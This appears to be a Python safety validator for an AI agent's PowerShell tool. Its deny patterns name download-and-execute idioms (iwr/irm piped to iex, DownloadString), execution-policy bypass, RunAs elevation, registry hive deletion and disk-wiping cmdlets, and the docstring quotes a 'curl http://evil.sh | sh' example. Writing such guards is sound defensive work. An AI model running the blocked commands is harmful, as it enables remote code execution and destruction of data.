"""Safety validation for the Amplifier pwsh (PowerShell) tool.

Mirrors amplifier-module-tool-bash's ``safety.py`` config surface
deliberately and exactly: the same four profile names (``strict`` /
``standard`` / ``permissive`` / ``unrestricted``), the same
``safety_profile`` / ``allowed_commands`` / ``denied_commands`` config
keys. Bundle configuration merges by *module ID*, so a second shell module
with a different config shape would mean an operator's
``safety_profile: strict`` silently fails to apply to this tool. Matching
the surface means the muscle memory, the documentation, and the operator's
mental model all transfer intact.

This is NOT parity with bash's *coverage*. Measured directly against
tool-bash's shipped patterns: it has zero rules for remote-script execution
across all four profiles -- ``curl http://evil.sh | sh`` is allowed even
under ``strict``. This module closes that specific gap for PowerShell's
equivalent idiom (``Invoke-WebRequest``/``iwr``/``Invoke-RestMethod``/``irm``
piped into ``Invoke-Expression``/``iex``, or ``.DownloadString(...)`` fed to
either), plus PowerShell-specific escalation vectors bash has no equivalent
for: execution-policy bypass, ``-Verb RunAs`` elevation, registry-hive
deletion, and disk-destroying cmdlets.

On "cannot parse -> must not report safe": a validator that cannot
classify its input must never fall through to "allowed". Full syntax-aware
checking (parsing via PowerShell's own
``[System.Management.Automation.Language.Parser]::ParseInput`` AST, as a
more capable reference implementation does) is deliberately NOT adopted
here -- it requires shelling out to a live PowerShell process for every
single validation call, which is a real, ongoing cost (the grammar moves;
an AST layer has to move with it) that is not justified until the
pattern-based layer proves insufficient in practice. This module instead
adopts the *principle* immediately, cheaply: a structural sanity pass
(quote and bracket balance) that catches the most common "this can't
possibly be what it looks like" cases -- unbalanced quotes, unbalanced
parens/braces/brackets -- and denies rather than silently allowing whatever
is left over after the pattern scan. See ``_check_structural_sanity``.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Literal


@dataclass
class BlockPattern:
    """A pattern to match against commands for blocking.

    Attributes:
        pattern: The pattern string to match.
        reason: Human-readable explanation of why this is blocked.
        check_type: How to match the pattern:
            - "command": Only match at command position (not in paths/strings)
            - "substring": Simple case-insensitive substring match
            - "regex": Full regex pattern matching (case-insensitive)
    """

    pattern: str
    reason: str
    check_type: Literal["command", "substring", "regex"] = "substring"


@dataclass
class SafetyProfile:
    """A safety profile defining blocked patterns and override behavior."""

    name: str
    blocked_patterns: list[BlockPattern]
    allow_overrides: bool = False


@dataclass
class SafetyResult:
    """Result of a safety validation check."""

    allowed: bool
    reason: str | None = None
    matched_pattern: str | None = None
    hint: str | None = None


@dataclass
class SafetyConfig:
    """Configuration for safety validation.

    Field names are identical to amplifier-module-tool-bash's
    ``SafetyConfig`` on purpose -- see module docstring.
    """

    profile: str = "strict"
    allowed_commands: list[str] = field(default_factory=list)
    denied_commands: list[str] = field(default_factory=list)
    safety_overrides: dict | None = None


# =============================================================================
# Predefined Safety Profiles
# =============================================================================

# Remote-script execution: the exact gap measured absent in tool-bash's
# STRICT/STANDARD profiles (curl|sh passed there). Covers the PowerShell
# native cmdlets and their common aliases, piped or fed into
# Invoke-Expression/iex, plus .DownloadString(...) (a common
# no-pipe-needed variant since it returns the string directly).
_REMOTE_EXEC_PATTERNS = [
    BlockPattern(
        r"(Invoke-WebRequest|iwr|Invoke-RestMethod|irm|wget|curl)\b[^|]*\|\s*(Invoke-Expression|iex)\b",
        "Pipeline code injection: remote content piped directly into Invoke-Expression",
        "regex",
    ),
    BlockPattern(
        r"\.DownloadString\s*\(",
        "Remote content download-and-execute pattern (WebClient.DownloadString)",
        "regex",
    ),
    BlockPattern(
        r"\.DownloadFile\s*\(",
        "Remote file download via WebClient.DownloadFile",
        "regex",
    ),
    # Bare Invoke-Expression/iex is blocked outright in strict/standard: it is
    # PowerShell's "run this arbitrary string as code" primitive, the direct
    # analogue of shell `eval` -- the piped-from-remote form above is the
    # sharpest instance of the hazard, but the primitive itself is the root
    # of it regardless of where the string originated.
    BlockPattern(
        "Invoke-Expression",
        "Arbitrary dynamic code execution (eval-equivalent)",
        "command",
    ),
    BlockPattern(
        "iex", "Arbitrary dynamic code execution (eval-equivalent alias)", "command"
    ),
]

_EXECUTION_POLICY_PATTERNS = [
    # `[^\n]*` (rather than a tight, flag-shaped pattern) deliberately does
    # not try to parse Set-ExecutionPolicy's parameter grammar -- it just
    # requires the cmdlet name and one of the dangerous values to appear
    # anywhere later in the same line, in either order of flags/positional
    # arguments (e.g. `-Scope Process Unrestricted`, `-Scope CurrentUser
    # -ExecutionPolicy Bypass`, or the bare positional form).
    BlockPattern(
        r"Set-ExecutionPolicy\b[^\n]*(Bypass|Unrestricted)",
        "Execution-policy bypass disables PowerShell's script-execution safeguard",
        "regex",
    ),
    BlockPattern(
        r"-ExecutionPolicy\s+(Bypass|Unrestricted)",
        "Execution-policy bypass via command-line switch",
        "regex",
    ),
]

_ELEVATION_PATTERNS = [
    BlockPattern(
        r"Start-Process\b[^\n]*-Verb\s+RunAs",
        "Privilege escalation via Start-Process -Verb RunAs",
        "regex",
    ),
]

_REGISTRY_HIVE_DELETION_PATTERNS = [
    BlockPattern(
        r"Remove-Item\b[^\n]*(HKLM:|HKCU:|HKEY_LOCAL_MACHINE|HKEY_CURRENT_USER|Registry::)",
        "Registry hive deletion",
        "regex",
    ),
    BlockPattern(
        r"reg(\.exe)?\s+delete\s+(HKLM|HKCU|HKEY_LOCAL_MACHINE|HKEY_CURRENT_USER)",
        "Registry hive deletion via reg.exe",
        "regex",
    ),
]

_DISK_OPERATION_PATTERNS = [
    BlockPattern("Format-Volume", "Disk formatting not allowed", "command"),
    BlockPattern("Clear-Disk", "Disk wipe not allowed", "command"),
    BlockPattern(
        "Initialize-Disk",
        "Disk initialization (wipes partition table) not allowed",
        "command",
    ),
    BlockPattern("Remove-Partition", "Partition deletion not allowed", "command"),
]

_ROOT_HOME_DELETION_PATTERNS = [
    BlockPattern(
        r"Remove-Item\b[^\n]*-Recurse\b[^\n]*(-Path\s+)?([\"']?[A-Za-z]:\\[\"']?\s|[\"']?[A-Za-z]:\\[\"']?$)",
        "Recursive deletion of a drive root",
        "regex",
    ),
    BlockPattern(
        r"Remove-Item\b[^\n]*-Recurse\b[^\n]*\$env:USERPROFILE\b",
        "Recursive deletion of the user's home directory",
        "regex",
    ),
    BlockPattern(
        r"Remove-Item\b[^\n]*-Recurse\b[^\n]*~[\\/]?\s*$",
        "Recursive deletion of the user's home directory (~)",
        "regex",
    ),
]

STRICT_PROFILE = SafetyProfile(
    name="strict",
    blocked_patterns=[
        *_REMOTE_EXEC_PATTERNS,
        *_EXECUTION_POLICY_PATTERNS,
        *_ELEVATION_PATTERNS,
        *_REGISTRY_HIVE_DELETION_PATTERNS,
        *_DISK_OPERATION_PATTERNS,
        *_ROOT_HOME_DELETION_PATTERNS,
    ],
    allow_overrides=False,
)

STANDARD_PROFILE = SafetyProfile(
    name="standard",
    blocked_patterns=[
        *_REMOTE_EXEC_PATTERNS,
        *_EXECUTION_POLICY_PATTERNS,
        *_ELEVATION_PATTERNS,
        *_REGISTRY_HIVE_DELETION_PATTERNS,
        *_DISK_OPERATION_PATTERNS,
        *_ROOT_HOME_DELETION_PATTERNS,
    ],
    allow_overrides=True,  # Key difference: allowlist can override
)

PERMISSIVE_PROFILE = SafetyProfile(
    name="permissive",
    blocked_patterns=[
        # Remote-script execution stays blocked even in permissive mode --
        # this is the specific, proven-dangerous gap the whole safety layer
        # exists to close, matching the seriousness bash gives `rm -rf /`
        # (which it keeps blocked at every profile short of unrestricted).
        BlockPattern(
            r"(Invoke-WebRequest|iwr|Invoke-RestMethod|irm|wget|curl)\b[^|]*\|\s*(Invoke-Expression|iex)\b",
            "Pipeline code injection: remote content piped directly into Invoke-Expression",
            "regex",
        ),
        BlockPattern(
            r"\.DownloadString\s*\(",
            "Remote content download-and-execute pattern (WebClient.DownloadString)",
            "regex",
        ),
        *_DISK_OPERATION_PATTERNS,
    ],
    allow_overrides=True,
)

UNRESTRICTED_PROFILE = SafetyProfile(
    name="unrestricted",
    blocked_patterns=[],
    allow_overrides=True,
)

PROFILES: dict[str, SafetyProfile] = {
    "strict": STRICT_PROFILE,
    "standard": STANDARD_PROFILE,
    "permissive": PERMISSIVE_PROFILE,
    "unrestricted": UNRESTRICTED_PROFILE,
}


class SafetyValidator:
    """Validates PowerShell commands against safety rules for a profile.

    Layered approach:
        0. Unrestricted profile bypasses everything (matches tool-bash).
        1. Structural sanity pass -- unbalanced quotes/brackets are denied
           outright, never silently allowed (see module docstring).
        2. Allowlist checked (if profile allows overrides).
        3. Blocked patterns checked with smart matching.
        4. Custom denied_commands checked.
        5. Override blocks checked.
        6. Default: allow.
    """

    def __init__(self, profile: str = "strict", config: SafetyConfig | None = None):
        if profile not in PROFILES:
            valid_profiles = ", ".join(PROFILES.keys())
            raise ValueError(
                f"Unknown profile '{profile}'. Valid profiles: {valid_profiles}"
            )

        self.profile = PROFILES[profile]
        self.config = config or SafetyConfig(profile=profile)

        self.allowed_commands = self.config.allowed_commands
        self.denied_commands = self.config.denied_commands

        self._override_allows: list[str] = []
        self._override_blocks: list[str] = []
        if self.config.safety_overrides:
            self._override_allows = self.config.safety_overrides.get("allow", [])
            self._override_blocks = self.config.safety_overrides.get("block", [])

    def validate(self, command: str) -> SafetyResult:
        """Validate a PowerShell command against safety rules.

        Args:
            command: The PowerShell command/script text to validate.

        Returns:
            SafetyResult indicating whether the command is allowed.
        """
        # 0. Unrestricted profile = always allow, no exceptions -- an
        # explicit opt-out of every check, matching tool-bash exactly.
        if self.profile.name == "unrestricted":
            return SafetyResult(allowed=True)

        # 1. Structural sanity: a command we cannot even parse the shape of
        # (unbalanced quotes/brackets) must never be reported safe, because
        # we cannot know what pattern-matching against garbage actually
        # proved. Deny before anything else, including the allowlist --
        # an allowlist wildcard matching malformed text tells us nothing
        # about what that text actually does.
        sanity_issue = self._check_structural_sanity(command)
        if sanity_issue is not None:
            return SafetyResult(
                allowed=False,
                reason=f"Command could not be structurally validated: {sanity_issue}",
                matched_pattern=None,
                hint="Fix unbalanced quotes/brackets so the command shape can be checked.",
            )

        # 2. Check allowlist (if profile allows overrides)
        if self.profile.allow_overrides and self._matches_allowlist(command):
            return SafetyResult(allowed=True)

        # 3. Check blocked patterns with smart matching
        for pattern in self.profile.blocked_patterns:
            if self._check_pattern(command, pattern):
                return SafetyResult(
                    allowed=False,
                    reason=pattern.reason,
                    matched_pattern=pattern.pattern,
                    hint="Use safety_profile: 'permissive' or 'unrestricted' for container/VM environments",
                )

        # 4. Check custom denied_commands (supports wildcards)
        for denied in self.denied_commands:
            if self._matches_wildcard(command, denied):
                return SafetyResult(
                    allowed=False,
                    reason=f"Matches custom denied pattern: {denied}",
                    matched_pattern=denied,
                    hint="Remove from denied_commands or add to allowed_commands (if profile allows overrides)",
                )

        # 5. Check override blocks (from safety_overrides.block)
        for block_pattern in self._override_blocks:
            if self._matches_wildcard(command, block_pattern):
                return SafetyResult(
                    allowed=False,
                    reason=f"Blocked by safety_overrides: {block_pattern}",
                    matched_pattern=block_pattern,
                    hint="Remove from safety_overrides.block",
                )

        # 6. Default: allow
        return SafetyResult(allowed=True)

    # -- Structural sanity (the "cannot parse -> not safe" gate) --------

    def _check_structural_sanity(self, command: str) -> str | None:
        """Cheap, dependency-free approximation of "can this be parsed".

        Returns a human-readable description of the problem, or ``None`` if
        the command's quotes and brackets are balanced. This is NOT a
        PowerShell parser -- it cannot catch every malformed script -- but
        it catches the class of input where pattern matching is most likely
        to be meaningless (a command whose quoting means we cannot even
        tell where one token ends and the next begins), and it costs
        nothing (no subprocess, no .NET dependency).

        Full AST-based validation is a deliberate non-goal here; see the
        module docstring.
        """
        quote_error = self._find_unbalanced_quote(command)
        if quote_error is not None:
            return quote_error

        bracket_error = self._find_unbalanced_bracket(command)
        if bracket_error is not None:
            return bracket_error

        return None

    def _find_unbalanced_quote(self, command: str) -> str | None:
        # Scan for an unterminated single- or double-quoted region.
        #
        # PowerShell quoting rules honored:
        #   - Backtick escapes the next character inside a double-quoted
        #     string only.
        #   - Doubling the SAME quote character inside a string of that
        #     type is a literal escaped quote (two single quotes in a row
        #     inside a single-quoted string, or two double quotes in a row
        #     inside a double-quoted string) -- not a close-then-reopen.
        state: str | None = None  # None, "'" , or '"'
        i = 0
        n = len(command)
        while i < n:
            ch = command[i]
            if state is None:
                if ch in ("'", '"'):
                    state = ch
                i += 1
                continue

            # Inside a quoted region of type `state`.
            if state == '"' and ch == "`" and i + 1 < n:
                i += 2  # backtick escapes the next character
                continue
            if ch == state:
                if i + 1 < n and command[i + 1] == state:
                    i += 2  # doubled quote = literal escaped quote
                    continue
                state = None  # closing quote
                i += 1
                continue
            i += 1

        if state is not None:
            return f"unterminated {state!r}-quoted string"
        return None

    def _find_unbalanced_bracket(self, command: str) -> str | None:
        """Scan for unbalanced ``()``/``{}``/``[]``, ignoring quoted text."""
        pairs = {")": "(", "}": "{", "]": "["}
        openers = set(pairs.values())
        stack: list[str] = []
        state: str | None = None
        i = 0
        n = len(command)
        while i < n:
            ch = command[i]
            if state is not None:
                if state == '"' and ch == "`" and i + 1 < n:
                    i += 2
                    continue
                if ch == state:
                    if i + 1 < n and command[i + 1] == state:
                        i += 2
                        continue
                    state = None
                i += 1
                continue

            if ch in ("'", '"'):
                state = ch
                i += 1
                continue
            if ch in openers:
                stack.append(ch)
            elif ch in pairs:
                if not stack or stack[-1] != pairs[ch]:
                    return f"unmatched closing '{ch}'"
                stack.pop()
            i += 1

        if state is not None:
            return f"unterminated {state!r}-quoted string"
        if stack:
            return f"unclosed '{stack[-1]}'"
        return None

    # -- Wildcard / allowlist matching (same shape as tool-bash) --------

    def _matches_allowlist(self, command: str) -> bool:
        for pattern in self._override_allows:
            if self._matches_wildcard(command, pattern, substring_fallback=False):
                return True
        for pattern in self.allowed_commands:
            if self._matches_wildcard(command, pattern, substring_fallback=False):
                return True
        return False

    def _matches_wildcard(
        self, command: str, pattern: str, substring_fallback: bool = True
    ) -> bool:
        if command.lower() == pattern.lower():
            return True
        if "*" in pattern:
            regex_pattern = re.escape(pattern).replace(r"\*", ".*")
            regex_pattern = f"^{regex_pattern}$"
            if re.match(regex_pattern, command, re.IGNORECASE):
                return True
        elif substring_fallback:
            if pattern.lower() in command.lower():
                return True
        return False

    # -- Pattern checking (command position / substring / regex) --------

    def _check_pattern(self, command: str, pattern: BlockPattern) -> bool:
        if pattern.check_type == "substring":
            return self._check_substring(command, pattern.pattern)
        elif pattern.check_type == "command":
            return self._check_command_position(command, pattern.pattern)
        elif pattern.check_type == "regex":
            return self._check_regex(command, pattern.pattern)
        return self._check_substring(command, pattern.pattern)

    def _check_substring(self, command: str, pattern: str) -> bool:
        return pattern.lower() in command.lower()

    def _find_quoted_regions(self, command: str) -> list[tuple[int, int]]:
        regions = []
        i = 0
        while i < len(command):
            if command[i] in ('"', "'"):
                quote_char = command[i]
                start = i
                i += 1
                while i < len(command):
                    if command[i] == "`" and i + 1 < len(command):
                        i += 2
                        continue
                    if command[i] == quote_char:
                        regions.append((start, i + 1))
                        break
                    i += 1
            i += 1
        return regions

    def _in_quoted_region(self, pos: int, regions: list[tuple[int, int]]) -> bool:
        return any(start < pos < end for start, end in regions)

    def _is_in_command_position(self, command: str, idx: int) -> bool:
        quoted_regions = self._find_quoted_regions(command)
        if self._in_quoted_region(idx, quoted_regions):
            return False

        prefix = command[:idx].strip()
        if not prefix:
            return True

        before = command[:idx].rstrip()
        if not before:
            return True

        command_starters = [";", "|", "&&", "||", "(", "`", "$("]
        for starter in command_starters:
            if before.endswith(starter):
                return True
        if before.endswith("|") and not before.endswith("||"):
            return True
        return False

    def _check_command_position(self, command: str, pattern: str) -> bool:
        command_lower = command.lower()
        pattern_lower = pattern.lower()

        start = 0
        while True:
            idx = command_lower.find(pattern_lower, start)
            if idx == -1:
                break
            if self._is_in_command_position(command, idx):
                # Ensure the match is a whole token, not part of a longer
                # cmdlet/variable name (e.g. "iex" must not match inside
                # "Get-ItemExtension" or similar).
                end = idx + len(pattern)
                char_before_ok = idx == 0 or not (
                    command[idx - 1].isalnum() or command[idx - 1] in "-_"
                )
                char_after_ok = end >= len(command) or not (
                    command[end].isalnum() or command[end] in "-_"
                )
                if char_before_ok and char_after_ok:
                    return True
            start = idx + 1
        return False

    def _check_regex(self, command: str, pattern: str) -> bool:
        try:
            return bool(re.search(pattern, command, re.IGNORECASE))
        except re.error:
            return False
